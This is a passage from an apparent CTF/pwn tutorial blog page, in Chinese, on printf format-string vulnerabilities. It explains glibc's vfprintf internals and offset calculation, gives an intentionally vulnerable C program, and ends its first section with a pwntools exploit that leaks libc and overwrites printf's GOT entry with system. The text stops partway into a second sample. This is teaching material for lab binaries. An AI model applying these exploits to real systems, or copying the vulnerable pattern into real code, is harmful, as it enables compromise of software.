@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang=zh-CN>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta property="og:description" content="">
+    <meta property="og:type" content="website">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        格式化字符串 - rot_will&#39;s Blog
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
+    <link href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.png" />
+        </div>
+        <div class="name">
+            <i>rot_will</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>主页</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>标签</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>存档</span>
+                </a>
+            </li>
+            <li >
+                <a href="/collect/">
+                    <i class="iconfont icon-shoucang1"></i>
+                    <span>收藏</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>关于</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>搜索</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%88%E8%A1%8C%E7%9F%A5%E8%AF%86"><span class="toc-text">先行知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E4%B8%AD%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-text">栈中格式化字符串</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E6%A0%88%E4%B8%AD%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-text">非栈中格式化字符串</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D"><span class="toc-text">第一种</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D"><span class="toc-text">第二种</span></a></li></ol></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-bg" id="search-bg"></div>
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        格式化字符串
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2022-06-23 19:41:54</span></span>
+        
+        <span class="attr">标签：/
+        
+        <a class="tag" href="/tags/#ctf" title="ctf">ctf</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#pwn" title="pwn">pwn</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content no-indent">
+        <p>利用程序直接对用户可控制的数据格式化，让用户可以利用格式化字符串达到任意地址读写<br>因为格式化字符串的参数在栈中，所以尽管无法写，也可以从栈中获取些有用的信息</p>
+<h2 id="先行知识"><a href="#先行知识" class="headerlink" title="先行知识"></a>先行知识</h2><p><code>printf</code>实际执行的是位于<code>stdio-common/vfprintf-internal.c</code>文件中的<code>vfprintf函数</code><br>在<code>vfprintf</code>中会按照占位符的顺序输出字符串，但如果占位符中存在<code>$</code>就会执行<code>printf_positional</code>函数<br>在<code>printf_positional</code>函数中会先将 字符串 中所有占位符都搜索出来，储存在数组中，然后遍历数组根据占位符类型输出字符串</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 在格式化字符串时会用到6个这样的表，用来防止存在歧义 */</span></span><br><span class="line"><span class="comment">/* Step 0: at the beginning.  */</span></span><br><span class="line"><span class="type">static</span> JUMP_TABLE_TYPE step0_jumps[<span class="number">30</span>] =</span><br><span class="line">&#123; <span class="comment">// 在下面，如果不存在对应类型的参数，则将剩下的参数中的第一个，强制转换为对应参数</span></span><br><span class="line">   <span class="comment">// 说是参数，实际上是栈中的值 在64位中，前六个参数使用寄存器</span></span><br><span class="line">  REF (form_unknown),</span><br><span class="line">  REF (flag_space),      <span class="comment">/* for &#x27; &#x27;          使用空格作为填充 默认也是空格*/</span></span><br><span class="line">  REF (flag_plus),       <span class="comment">/* for &#x27;+&#x27;          在正数前面添加 &#x27;+&#x27; */</span></span><br><span class="line">  REF (flag_minus),      <span class="comment">/* for &#x27;-&#x27;          右对齐*/</span></span><br><span class="line">  REF (flag_hash),       <span class="comment">/* for &#x27;&lt;hash&gt;&#x27; #     使用#号触发 与x 组合表示使用 0x??的格式 与 X组合表示使用 0X??的格式</span></span><br><span class="line"><span class="comment">                                                             与g/G 组合表示用0填充小数位*/</span></span><br><span class="line">  REF (flag_zero),       <span class="comment">/* for &#x27;0&#x27;          使用0作为填充仅在左对齐时有效*/</span></span><br><span class="line">  REF (flag_quote),      <span class="comment">/* for &#x27;\&#x27;&#x27;         暂时不知道用处*/</span></span><br><span class="line">  REF (width_asterics),  <span class="comment">/* for &#x27;*&#x27;          从printf后面的参数中获取整数类型参数作为输出宽度 宽度不能大于2147483647*/</span></span><br><span class="line">  REF (width),           <span class="comment">/* for &#x27;1&#x27;...&#x27;9&#x27;    这一条没有明确代码，但与 width_asterics 在一起执行，将字符串转换为整数 宽度不能大于2147483647</span></span><br><span class="line"><span class="comment">                     当数字后面是 $ 字符时，将数字作为偏移 */</span></span><br><span class="line">  REF (precision),       <span class="comment">/* for &#x27;.&#x27;          在搜索到 . 之后，如果后面的字符为 * 则将printf 中未使用过的参数中的整数作为小数长度位</span></span><br><span class="line"><span class="comment">                                                                    如果后面的字符为数字，就将数字作为小数位长度*/</span></span><br><span class="line">  REF (mod_half),        <span class="comment">/* for &#x27;h&#x27;          将数据当作 二字节数据处理 ，但如果两个h连在一起 则将数据作为 一字节数据处理*/</span></span><br><span class="line">  REF (mod_long),        <span class="comment">/* for &#x27;l&#x27;          将数据作为 四字节数据处理*/</span></span><br><span class="line">  REF (mod_longlong),    <span class="comment">/* for &#x27;L&#x27;, &#x27;q&#x27;     将数据作为 八字节数据处理*/</span></span><br><span class="line">  REF (<span class="type">mod_size_t</span>),      <span class="comment">/* for &#x27;z&#x27;, &#x27;Z&#x27;     通过 size_t 判断 将数据作为 四字节 还是 八字节处理*/</span></span><br><span class="line">  REF (form_percent),    <span class="comment">/* for &#x27;%&#x27;          输出 %*/</span></span><br><span class="line">  REF (form_integer),    <span class="comment">/* for &#x27;d&#x27;, &#x27;i&#x27;     将数据以十进制有符号整型的方式输出*/</span></span><br><span class="line">  REF (form_unsigned),   <span class="comment">/* for &#x27;u&#x27;          将数据以十进制无符号整型的方式输出*/</span></span><br><span class="line">  REF (form_octal),      <span class="comment">/* for &#x27;o&#x27;          将数据以八进制无符号整型的方式输出*/</span></span><br><span class="line">  REF (form_hexa),       <span class="comment">/* for &#x27;X&#x27;, &#x27;x&#x27;     将数据以十六进制无符号整型的方式输出</span></span><br><span class="line"><span class="comment">                                                    使用X表示以大写十六进制输出</span></span><br><span class="line"><span class="comment">                                                    使用x表示以小写十六进制输出*/</span></span><br><span class="line">  REF (form_float),      <span class="comment">/* for &#x27;E&#x27;, &#x27;e&#x27;, &#x27;F&#x27;, &#x27;f&#x27;, &#x27;G&#x27;, &#x27;g&#x27;   e/E 表示以指数的形式输出小数，区别为输出时e的大小写</span></span><br><span class="line"><span class="comment">                                                           f/F 表示以普通小数的形式输出小数，区别在于 当小数为无限小数或小数位过长时，输出的 inf,infinity,nan的大小写</span></span><br><span class="line"><span class="comment">                                                           g/G 按数值大小自动区分使用e或f 区别也是大小写*/</span></span><br><span class="line">  REF (form_character),  <span class="comment">/* for &#x27;c&#x27;          将参数中剩下的第一个整数作为字符输出*/</span></span><br><span class="line">  REF (form_string),     <span class="comment">/* for &#x27;s&#x27;, &#x27;S&#x27;     将printf参数中第一个参数，作为字符指针，输出指向的字符串*/</span></span><br><span class="line">  REF (form_pointer),    <span class="comment">/* for &#x27;p&#x27;          将printf参数中第一个指针 使用 %#x 的形式输出 当指针不存在时 使用整数*/</span></span><br><span class="line">  REF (form_number),     <span class="comment">/* for &#x27;n&#x27;          将当前输出的长度，写入到printf参数中剩下的第一个参数指向的位置*/</span></span><br><span class="line">  REF (form_strerror),   <span class="comment">/* for &#x27;m&#x27;          按照当前错误信息输出错误，当没有错误时输出 Success*/</span></span><br><span class="line">  REF (form_wcharacter), <span class="comment">/* for &#x27;C&#x27;          将printf参数中剩下的第一个 wchar_t 类型的参数，输出*/</span></span><br><span class="line">  REF (form_floathex),   <span class="comment">/* for &#x27;A&#x27;, &#x27;a&#x27;     按照十六进制的形式输出小数*/</span></span><br><span class="line">  REF (<span class="type">mod_ptrdiff_t</span>),   <span class="comment">/* for &#x27;t&#x27;          通过 ptrdiff_t 判断 将数据作为 四字节 还是 八字节处理*/</span></span><br><span class="line">  REF (<span class="type">mod_intmax_t</span>),    <span class="comment">/* for &#x27;j&#x27;          通过 intmax_t 判断 将数据作为 四字节 还是 八字节处理*/</span></span><br><span class="line">  REF (flag_i18n),       <span class="comment">/* for &#x27;I&#x27;          暂时不知道用处*/</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="center">数据宽度</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">h</td>
+<td>将数据作为<code>short</code>类型处理</td>
+</tr>
+<tr>
+<td align="center">hh</td>
+<td>将数据作为<code>char</code>类型处理</td>
+</tr>
+<tr>
+<td align="center">l</td>
+<td>将数据作为<code>long</code>类型处理</td>
+</tr>
+<tr>
+<td align="center">q&#x2F;L</td>
+<td>将数据作为<code>long long</code>类型处理</td>
+</tr>
+<tr>
+<td align="center">z&#x2F;Z</td>
+<td>通过<code>size_t</code>判断，将数据作为<code>long</code>类型处理还是以<code>long long</code>类型处理</td>
+</tr>
+</tbody></table>
+<br>
+
+<table>
+<thead>
+<tr>
+<th align="center">标志</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">space</td>
+<td>使用空格作为填充符号</td>
+</tr>
+<tr>
+<td align="center">+</td>
+<td>在正数的前面添加<code>+</code></td>
+</tr>
+<tr>
+<td align="center">-</td>
+<td>右对齐(默认左对齐)</td>
+</tr>
+<tr>
+<td align="center">#</td>
+<td>与<code>x/X</code>组合表示以<code>0x???</code>的形式输出，与<code>g/G</code>组合表示不省略小数结尾的<code>0</code></td>
+</tr>
+<tr>
+<td align="center">0</td>
+<td>表示使用0作为填充符号(仅右对齐时有效)</td>
+</tr>
+<tr>
+<td align="center">*</td>
+<td>将参数中最前面的整数作为输出数据的最小长度 (最大为<code>2147483647</code>)</td>
+</tr>
+<tr>
+<td align="center">0~9</td>
+<td>将字符串转换后的整数作为输出数据的最小长度 (最大为<code>2147483647</code>，为负数时表示右对齐)</td>
+</tr>
+<tr>
+<td align="center">$</td>
+<td>通过<code>$</code>前的数字获取参数的索引值，用于指定占位符处理的数据</td>
+</tr>
+<tr>
+<td align="center">.</td>
+<td>.数字 用来指定浮点数精度 或 字符串输出的最大长度</td>
+</tr>
+</tbody></table>
+<br>
+
+<table>
+<thead>
+<tr>
+<th align="center">类型</th>
+<th align="left">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">x</td>
+<td align="left">将无符号整型以全小写十六进制的形式输入输出</td>
+</tr>
+<tr>
+<td align="center">X</td>
+<td align="left">将无符号整型以全大写十六进制的形式输入输出</td>
+</tr>
+<tr>
+<td align="center">o</td>
+<td align="left">将无符号整型以八进制的形式输入输出</td>
+</tr>
+<tr>
+<td align="center">u</td>
+<td align="left">将无符号整型以十进制的形式输入输出</td>
+</tr>
+<tr>
+<td align="center">d</td>
+<td align="left">将有符号整型以十进制的形式输入输出</td>
+</tr>
+<tr>
+<td align="center">i</td>
+<td align="left">输入输出有符号整型(将开头为0的数字识别为八进制，将开头为0x的数字识别为十六进制)</td>
+</tr>
+<tr>
+<td align="center">f</td>
+<td align="left">以定点数表示法输出浮点数 (当浮点数 为 无限浮点数时输出<code>inf</code>,当 浮点数 无法作为数字处理时输出<code>nan</code>)</td>
+</tr>
+<tr>
+<td align="center">F</td>
+<td align="left">以定点数表示法输出浮点数 (当浮点数 为 无限浮点数时输出<code>INF</code>,当 浮点数 无法作为数字处理时输出<code>NAN</code>)</td>
+</tr>
+<tr>
+<td align="center">e</td>
+<td align="left">以指数表示法输出浮点数 (当浮点数 为 无限浮点数时输出<code>inf</code>,当 浮点数 无法作为数字处理时输出<code>nan</code>)</td>
+</tr>
+<tr>
+<td align="center">E</td>
+<td align="left">以指数表示法全大写输出浮点数 (当浮点数 为 无限浮点数时输出<code>INF</code>,当 浮点数 无法作为数字处理时输出<code>NAN</code>)</td>
+</tr>
+<tr>
+<td align="center">g</td>
+<td align="left">自动选择使用定点数或指数输出浮点数(效果为<code>f</code>和<code>e</code>的结合体)</td>
+</tr>
+<tr>
+<td align="center">G</td>
+<td align="left">自动选择使用定点数或指数输出浮点数(效果为<code>F</code>和<code>E</code>的结合体)</td>
+</tr>
+<tr>
+<td align="center">a</td>
+<td align="left">以十六进制的形式全小写输出浮点数(当小数为无限小数时输出<code>inf</code>,当小数无法作为数字处理时输出<code>nan</code>)</td>
+</tr>
+<tr>
+<td align="center">A</td>
+<td align="left">以十六进制的形式全大写输出浮点数(当小数为无限小数时输出<code>INF</code>,当小数无法作为数字处理时输出<code>NAN</code>)</td>
+</tr>
+<tr>
+<td align="center">s</td>
+<td align="left">输出指定地址中的数据 (以<code>\x00</code>截断) 输入时以<code>空格</code>或<code>\n</code>为截断</td>
+</tr>
+<tr>
+<td align="center">p</td>
+<td align="left">以十六进制的形式输出 地址&#x2F;整数 (当 地址&#x2F;整数为 0 时输出 <code>(nil)</code> )</td>
+</tr>
+<tr>
+<td align="center">c</td>
+<td align="left">以字符的形式输入输出数据</td>
+</tr>
+<tr>
+<td align="center">n</td>
+<td align="left">将已经输出的数据长度 写入指定地址</td>
+</tr>
+<tr>
+<td align="center">&#x3D;&#x3D;&#x3D;&#x3D;</td>
+<td align="left">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>使用 f&#x2F;F&#x2F;e&#x2F;E&#x2F;g&#x2F;G 输入 都可以识别 定点数表示法 和 指数表示法</p>
+</blockquote>
+<ul>
+<li>计算偏移<ul>
+<li>x86_64<blockquote>
+<p>通过 (需要使用的地址-调用printf时的rsp)&#x2F;8+6 获得<br>因为printf参数中除第一个为需要格式化的字符串，其他都是参数，<br>如果要获取rdi,rsi,rdx,rcx,r8,r9寄存器的值就使用 <code>0 &lt; s &lt; 6</code> 的偏移</p>
+</blockquote>
+</li>
+<li>x86<blockquote>
+<p>通过 (需要使用的地址-调用printf时的esp)&#x2F;4 获得</p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+<p>通过<code>n</code>进行任意写，通过<code>s</code>进行任意地址读，通过<code>p</code>获取栈中的数据</p>
+<h2 id="栈中格式化字符串"><a href="#栈中格式化字符串" class="headerlink" title="栈中格式化字符串"></a>栈中格式化字符串</h2><blockquote>
+<p>在栈中的格式化字符串比较简单，因为可以通过字符串中的地址，达到任意地址读写</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 示例代码 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> a[<span class="number">0x100</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,a);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(a,<span class="string">&quot;exit&quot;</span>,<span class="number">4</span>))&#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(a);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 编译命令</span></span><br><span class="line"><span class="comment">    gcc pwn_format.c  -no-pie -o pwn_format </span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>main函数代码(在此之上都是初始化变量的代码)<br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-format.jpg"></p>
+</blockquote>
+<blockquote>
+<p>main函数栈布局<br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-format-1.jpg"></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;exp思路</span></span><br><span class="line"><span class="string">    因为 main 函数是由 __libc_start_main 函数调用，</span></span><br><span class="line"><span class="string">    那么在栈中就一定存在 __libc_start_main 函数中的地址，</span></span><br><span class="line"><span class="string">    通过获取 __libc_start_main 函数中的地址可以获取到 libc的基地址 ，</span></span><br><span class="line"><span class="string">    通过基地址获取 system 函数的地址，</span></span><br><span class="line"><span class="string">    然后设置程序 got表 中 printf 项的值为 system 函数地址，</span></span><br><span class="line"><span class="string">    这样在每次执行 printf 函数时就会执行 system 函数</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; %41$p 计算过程</span></span><br><span class="line"><span class="string">    去除寄存器占用的 5 个参数，</span></span><br><span class="line"><span class="string">    那么字符串开头的偏移为 %6$p,</span></span><br><span class="line"><span class="string">    因为main函数的栈占用 0x110 字节，</span></span><br><span class="line"><span class="string">    再加上 push rbp ，所占用的 8 字节，</span></span><br><span class="line"><span class="string">    格式化的字符串开头到 __libc_start_main 之间 0x118 字节的数据，</span></span><br><span class="line"><span class="string">    所以 __libc_start_main 函数地址的偏移就为 0x118/8+6=41 </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">&#x27;./pwn_format&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.33.so&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./pwn_format&#x27;</span>)</span><br><span class="line">printf_got=e.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf_got))</span><br><span class="line">p.sendline(<span class="string">&#x27;%41$p&#x27;</span>)</span><br><span class="line">libc.address=<span class="built_in">int</span>(p.read(),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">213</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">data=p64(system)</span><br><span class="line">fs=&#123;&#125;</span><br><span class="line">n=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>]</span><br><span class="line">i=<span class="number">7</span></span><br><span class="line"><span class="keyword">while</span> i&gt;-<span class="number">1</span>:</span><br><span class="line">    fs[i]=<span class="built_in">ord</span>(data[i])</span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>*i+p64(printf_got+i)[:-<span class="number">1</span>]</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    i=i-<span class="number">1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    构造栈，使栈中存有 printf.got~printf.got+7 这八个地址</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">n.sort(key=<span class="keyword">lambda</span> d:fs[d])</span><br><span class="line">payload=<span class="string">&#x27;&#x27;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">8</span>:</span><br><span class="line">    <span class="keyword">if</span> fs[n[i]]==<span class="number">0</span>:</span><br><span class="line">        payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">18</span>+n[i])+<span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> fs[n[i]]-fs[n[i-<span class="number">1</span>]]==<span class="number">0</span>:</span><br><span class="line">            payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">18</span>+n[i])+<span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(fs[n[i]]-fs[n[i-<span class="number">1</span>]])+<span class="string">&#x27;c%&#x27;</span>+<span class="built_in">str</span>(<span class="number">18</span>+n[i])+<span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    这里是按照 system函数地址中每个字节所表示的数值，从小到大排列，防止修改时互相干扰</span></span><br><span class="line"><span class="string">    一般格式化字符串修改的数据宽度尽量要小，</span></span><br><span class="line"><span class="string">    因为数据宽度越大，表示在此之前输出的长度越长，</span></span><br><span class="line"><span class="string">    可能会导致将payload发送到靶机之后，</span></span><br><span class="line"><span class="string">    本地窗口一直在获取靶机中输出的内容，</span></span><br><span class="line"><span class="string">    这种情况非常浪费时间</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="非栈中格式化字符串"><a href="#非栈中格式化字符串" class="headerlink" title="非栈中格式化字符串"></a>非栈中格式化字符串</h2><blockquote>
+<p>堆中的格式化字符串比较麻烦<br>需要的条件为栈中存在 a 指向 b ，且b只有低四字节与a不同，<br>这时可以通过a修改b，然后利用b，在栈中创建一个指向某个区域的地址，<br>以此来达到任意地址读写</p>
+</blockquote>
+<p>一般存在两次函数调用操作时可以达到条件如 函数a调用函数b;函数b调用函数c<br>但 __libc_start_main 调用main,main调用某个函数除外，<br>因为__libc_start_main到main函数时储存在栈中的rbp&#x2F;ebp为0，无法组成链表</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 样例代码 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> *b)</span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%40s&quot;</span>,b);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(b,<span class="string">&quot;exit&quot;</span>,<span class="number">4</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span 